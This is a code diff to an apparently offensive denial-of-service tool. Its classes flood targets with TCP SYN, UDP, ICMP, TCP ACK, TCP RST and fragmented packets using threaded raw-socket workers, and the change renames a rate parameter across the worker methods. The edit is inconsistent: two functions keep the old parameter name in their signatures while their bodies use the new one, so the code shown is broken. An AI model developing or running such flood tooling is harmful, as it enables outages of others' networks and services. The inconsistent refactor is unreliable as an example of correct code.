@@ -263,7 +263,7 @@ class TCPFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
     
-    def _tcp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_second: int):
+    def _tcp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
         """Ultra-performance TCP flood worker thread"""
         sock = None
         packets_sent = 0
@@ -308,7 +308,7 @@ class TCPFloodAttack(Layer4Attack):
     
     def _raw_tcp_flood(self, sock: socket.socket, target_ports: List[int], packets_per_second: int):
         """Raw socket TCP flood"""
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         while self.is_running:
@@ -353,7 +353,7 @@ class TCPFloodAttack(Layer4Attack):
     
     def _regular_tcp_flood(self, target_ports: List[int], packets_per_second: int):
         """Regular socket TCP flood (SYN flood simulation)"""
-        connection_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        connection_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_connection_time = time.time()
         
         while self.is_running:
@@ -444,7 +444,7 @@ class UDPFloodAttack(Layer4Attack):
             for thread_id in range(self.config.threads):
                 future = executor.submit(
                     self._udp_flood_worker,
-                    thread_id, target_ports, packets_per_second
+                    thread_id, target_ports, packets_per_thread
                 )
                 futures.append(future)
             
@@ -469,10 +469,10 @@ class UDPFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
     
-    def _udp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_second: int):
+    def _udp_flood_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
         """Worker thread for UDP flood"""
         sock = self.sockets[thread_id % len(self.sockets)]
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         while self.is_running:
@@ -582,10 +582,10 @@ class ICMPFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
     
-    def _icmp_flood_worker(self, thread_id: int, packets_per_second: int):
+    def _icmp_flood_worker(self, thread_id: int, packets_per_thread: int):
         """Worker thread for ICMP flood"""
         sock = self.sockets[thread_id]
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         icmp_types = [8, 13, 15, 17]  # Echo, Timestamp, Info Request, Address Mask
@@ -759,10 +759,10 @@ class TCPACKFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
 
-    def _tcp_ack_worker(self, thread_id: int, target_ports: List[int], packets_per_second: int):
+    def _tcp_ack_worker(self, thread_id: int, target_ports: List[int], packets_per_thread: int):
         """Worker thread for TCP ACK flood"""
         sock = self.sockets[thread_id % len(self.sockets)]
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         while self.is_running:
@@ -858,7 +858,7 @@ class TCPRSTFloodAttack(Layer4Attack):
             for thread_id in range(self.config.threads):
                 future = executor.submit(
                     self._rst_flood_worker,
-                    thread_id, packets_per_second
+                    thread_id, packets_per_thread
                 )
                 futures.append(future)
             
@@ -881,9 +881,9 @@ class TCPRSTFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
 
-    def _rst_flood_worker(self, thread_id: int, packets_per_second: int):
+    def _rst_flood_worker(self, thread_id: int, packets_per_thread: int):
         """Worker thread for TCP RST flood"""
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         try:
@@ -970,7 +970,7 @@ class FragmentedPacketFloodAttack(Layer4Attack):
             for thread_id in range(self.config.threads):
                 future = executor.submit(
                     self._fragment_flood_worker,
-                    thread_id, packets_per_second
+                    thread_id, packets_per_thread
                 )
                 futures.append(future)
             
@@ -993,9 +993,9 @@ class FragmentedPacketFloodAttack(Layer4Attack):
             'bytes_sent': self.stats['bytes_sent']
         }
 
-    def _fragment_flood_worker(self, thread_id: int, packets_per_second: int):
+    def _fragment_flood_worker(self, thread_id: int, packets_per_thread: int):
         """Worker thread for fragmented packet flood"""
-        packet_interval = 1.0 / packets_per_second if packets_per_second > 0 else 0
+        packet_interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
         last_packet_time = time.time()
         
         try:
